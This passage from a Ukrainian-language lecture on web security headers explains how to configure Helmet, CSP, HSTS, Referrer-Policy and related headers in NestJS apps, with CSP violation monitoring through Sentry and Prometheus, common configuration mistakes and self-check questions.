  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://cdn.example.com"], // Без unsafe-inline
  },
}
```

---

## Інтеграція з системами моніторингу

### Логування порушень CSP до Sentry

```typescript
// src/csp/csp-report.service.ts
import { Injectable } from '@nestjs/common';
import * as Sentry from '@sentry/node';

@Injectable()
export class CspReportService {
  logViolation(report: any) {
    const cspReport = report['csp-report'];

    // Відправити до Sentry
    Sentry.captureMessage('CSP Violation', {
      level: 'warning',
      tags: {
        type: 'csp-violation',
        violatedDirective: cspReport['violated-directive'],
      },
      extra: {
        blockedUri: cspReport['blocked-uri'],
        documentUri: cspReport['document-uri'],
        sourceFile: cspReport['source-file'],
        lineNumber: cspReport['line-number'],
      },
    });
  }
}
```

**Використання:**

```typescript
@Controller('api/csp-report')
export class CspReportController {
  constructor(private cspReportService: CspReportService) {}

  @Post()
  handleReport(@Body() report: any) {
    this.cspReportService.logViolation(report);
    return { received: true };
  }
}
```

### Метрики security headers у Prometheus

```typescript
// src/monitoring/security-headers.metrics.ts
import { Injectable } from '@nestjs/common';
import { Counter } from 'prom-client';

@Injectable()
export class SecurityHeadersMetrics {
  private cspViolationsCounter = new Counter({
    name: 'csp_violations_total',
    help: 'Total number of CSP violations',
    labelNames: ['violated_directive', 'blocked_uri'],
  });

  recordCspViolation(violatedDirective: string, blockedUri: string) {
    this.cspViolationsCounter.inc({
      violated_directive: violatedDirective,
      blocked_uri: blockedUri,
    });
  }
}
```

**Grafana Dashboard для моніторингу:**

```promql
# Кількість CSP порушень за останню годину
rate(csp_violations_total[1h])

# Топ-5 джерел порушень
topk(5, sum by (blocked_uri) (csp_violations_total))
```

---

## Security Headers для різних типів застосунків

### REST API (JSON only)

Для чистого JSON API (без HTML frontend):

```typescript
app.use(
  helmet({
    contentSecurityPolicy: false, // Не потрібен для JSON API
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
    },
    frameguard: { action: 'deny' },
    noSniff: true,
    referrerPolicy: { policy: 'no-referrer' },
    permissionsPolicy: {
      features: {
        camera: ["'none'"],
        microphone: ["'none'"],
        geolocation: ["'none'"],
      },
    },
  })
);
```

**Чому CSP не потрібен:** JSON API не завантажує scripts, styles чи інші ресурси — лише повертає дані.

### SPA з окремим frontend

Якщо backend (NestJS) та frontend (React/Vue) розгорнуті на різних доменах:

**Backend (API):**

```typescript
// api.example.com
app.use(
  helmet({
    contentSecurityPolicy: false, // Frontend налаштовує свій CSP
    hsts: { maxAge: 31536000, includeSubDomains: true },
    frameguard: { action: 'deny' },
  })
);
```

**Frontend (Nginx або CDN):**

```nginx
# app.example.com
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; connect-src https://api.example.com" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
```

### SSR застосунок (Next.js, Nuxt)

Для Server-Side Rendered застосунків з динамічним контентом:

```typescript
// src/main.ts
import crypto from 'crypto';

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com`
  );

  next();
});

app.use(helmet({ contentSecurityPolicy: false })); // CSP вже налаштований вище
```

### Застосунки з iframe (OAuth, Widgets)

Якщо ваш застосунок вбудовується у iframe (наприклад, OAuth login popup):

```typescript
app.use(
  helmet({
    frameguard: false, // Вимкнути X-Frame-Options
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        frameAncestors: [
          "'self'",
          "https://oauth-provider.com",
          "https://partner-site.com",
        ],
      },
    },
  })
);
```

---

## Типові помилки при налаштуванні Security Headers

### Помилка 1: CSP блокує HMR у розробці

**Симптом:** Vite/Webpack Hot Module Replacement не працює.

**Причина:** CSP блокує WebSocket з'єднання для HMR.

**Рішення:**

```typescript
// src/main.ts
const isDev = process.env.NODE_ENV === 'development';

app.use(
  helmet({
    contentSecurityPolicy: isDev
      ? false // Вимкнути у dev режимі
      : {
          directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "https://cdn.example.com"],
          },
        },
  })
);
```

### Помилка 2: HSTS на localhost

**Симптом:** Браузер блокує доступ до `http://localhost:3000` після увімкнення HSTS.

**Причина:** HSTS примушує HTTPS, але localhost зазвичай використовує HTTP.

**Рішення:**

```typescript
const isProduction = process.env.NODE_ENV === 'production';

app.use(
  helmet({
    hsts: isProduction
      ? { maxAge: 31536000, includeSubDomains: true }
      : false, // Вимкнути у dev
  })
);
```

**Якщо вже спіймали помилку:** видаліть HSTS для localhost у браузері:

1. Chrome: відкрийте `chrome://net-internals/#hsts`
2. У розділі "Delete domain security policies" введіть `localhost`
3. Натисніть "Delete"

### Помилка 3: CSP блокує inline styles у CSS-in-JS

**Симптом:** Styled-components або Emotion не застосовують стилі.

**Причина:** CSP блокує inline styles за замовчуванням.

**Рішення:** Додайте `'unsafe-inline'` для `style-src`:

```typescript
contentSecurityPolicy: {
  directives: {
    styleSrc: ["'self'", "'unsafe-inline'"], // Для CSS-in-JS
  },
}
```

**Альтернатива (безпечніша):** використовуйте nonce для кожного стилю (потребує інтеграції з бібліотекою CSS-in-JS).

### Помилка 4: CSP блокує Google Fonts

**Симптом:** Шрифти з Google Fonts не завантажуються.

**Причина:** CSP не дозволяє завантаження з `fonts.googleapis.com` та `fonts.gstatic.com`.

**Рішення:**

```typescript
contentSecurityPolicy: {
  directives: {
    styleSrc: ["'self'", "https://fonts.googleapis.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
  },
}
```

### Помилка 5: X-Frame-Options конфліктує з CSP frame-ancestors

**Симптом:** Браузер показує попередження про конфлікт заголовків.

**Причина:** `X-Frame-Options` та CSP `frame-ancestors` виконують одну функцію.

**Рішення:** Використовуйте лише CSP (сучасніший підхід):

```typescript
app.use(
  helmet({
    frameguard: false, // Вимкнути X-Frame-Options
    contentSecurityPolicy: {
      directives: {
        frameAncestors: ["'self'"], // Використовувати CSP
      },
    },
  })
);
```

---

## Інтерактивні запитання для самоперевірки

::accordion

::accordion-item{label="❓ Чому CSP з 'unsafe-inline' для scriptSrc майже не надає захисту від XSS?" icon="i-lucide-help-circle"}

**Content Security Policy** розроблена для блокування виконання небажаного JavaScript коду. Основна загроза XSS — це впровадження **inline scripts** (наприклад, `<script>alert('XSS')</script>`) через некоректну фільтрацію користувацького вводу.

Якщо ви додаєте `'unsafe-inline'` до `scriptSrc`:

```typescript
scriptSrc: ["'self'", "'unsafe-inline'"]
```

…то CSP **дозволить виконання будь-яких inline scripts**, включаючи зловмисні, впроваджені через XSS вразливість.

**Висновок:** `'unsafe-inline'` нівелює основну перевагу CSP. Використовуйте його лише для `styleSrc` (CSS-in-JS бібліотеки) або замініть inline scripts на nonce/hash базовані підходи.

**Безпечна альтернатива:**

```typescript
// Генерувати nonce для кожного запиту
const nonce = crypto.randomBytes(16).toString('base64');

// CSP
scriptSrc: ["'self'", `'nonce-${nonce}'`]

// HTML
<script nonce="<%= nonce %>">
  console.log('Цей script дозволений');
</script>
```

::

::accordion-item{label="❓ Чи можна видалити домен з HSTS Preload List швидко?" icon="i-lucide-help-circle"}

**Ні, це складний та тривалий процес.**

Якщо ви додали домен до HSTS Preload List (через [hstspreload.org](https://hstspreload.org)), то цей домен вбудовується у **вихідний код браузерів** (Chromium, Firefox, Safari).

**Процес видалення:**

1. **Видалити HSTS заголовок** з вашого сервера або встановити `max-age=0`:
   ```http
   Strict-Transport-Security: max-age=0
   ```

2. **Подати запит на видалення** на hstspreload.org.

3. **Очікувати оновлення браузерів** — може зайняти **3-6 місяців**, поки нова версія Chrome/Firefox без вашого домену дійде до всіх користувачів.

**Чому так довго:** браузери отримують оновлений список лише з новими релізами. Користувачі зі старими версіями браузерів **не зможуть** отримати доступ до вашого сайту через HTTP до оновлення браузера.

**Рекомендація:** додавайте до Preload List лише домени, де HTTPS є **постійною вимогою** (production сайти, API). Не додавайте staging чи dev середовища.

::

::accordion-item{label="❓ Чому Referrer-Policy important для SPA застосунків?" icon="i-lucide-help-circle"}

Single Page Applications часто зберігають **чутливу інформацію у URL** (наприклад, токени, ідентифікатори користувачів, фільтри):

```
https://app.example.com/dashboard?userId=12345&token=abc123&filter=confidential
```

Якщо користувач натискає зовнішнє посилання з цієї сторінки (наприклад, посилання на документацію або соціальні мережі), браузер **за замовчуванням відправить повний URL у Referer header**:

```http
GET /external-page HTTP/1.1
Host: external-site.com
Referer: https://app.example.com/dashboard?userId=12345&token=abc123&filter=confidential
```

**Проблема:** зовнішній сайт отримує конфіденційні параметри з URL.

**Рішення:** використовуйте `strict-origin-when-cross-origin` або `origin`:

```typescript
referrerPolicy: {
  policy: 'strict-origin-when-cross-origin',
}
```

**Результат:** браузер відправить лише origin без шляху та query parameters:

```http
Referer: https://app.example.com
```

**Додаткова захист:** не зберігайте чутливу інформацію у URL. Використовуйте POST запити або session storage.

::

::

---

## Підсумок

::card-group

::card{title="🛡️ Security Headers" icon="i-lucide-shield"}

**HTTP Security Headers — перша лінія захисту:**
- Інструктують браузер про правила безпеки
- Захищають від XSS, clickjacking, MITM атак
- Мінімізують витік конфіденційної інформації
- Не замінюють інші рівні безпеки (валідація вводу, аутентифікація)

**Helmet автоматизує налаштування 15+ заголовків**

::

::card{title="🔐 Ключові заголовки" icon="i-lucide-lock"}

**Must-have для продакшену:**
- **CSP** — контроль джерел ресурсів, захист від XSS
- **HSTS** — примусове HTTPS
- **X-Frame-Options / frame-ancestors** — захист від clickjacking
- **X-Content-Type-Options** — заборона MIME sniffing
- **Referrer-Policy** — контроль витоку інформації

**Permissions-Policy — контроль браузерних API (camera, geolocation)**

::

::card{title="⚙️ Практичні кроки" icon="i-lucide-settings"}

**Впровадження у проєкт:**
1. Встановити `helmet` та підключити у `main.ts`
2. Налаштувати CSP для вашого tech stack
3. Увімкнути HSTS для продакшену (з умовою)
4. Протестувати через securityheaders.com
5. Використовувати CSP report-only для поетапного впровадження

**Моніторинг порушень CSP через Sentry/Prometheus**

::

::

У наступній лекції ми розглянемо захист API від зловживань через **Rate Limiting та Throttling** — обмеження кількості запитів від одного клієнта за проміжок часу для захисту від brute force атак, DDoS та надмірного навантаження.
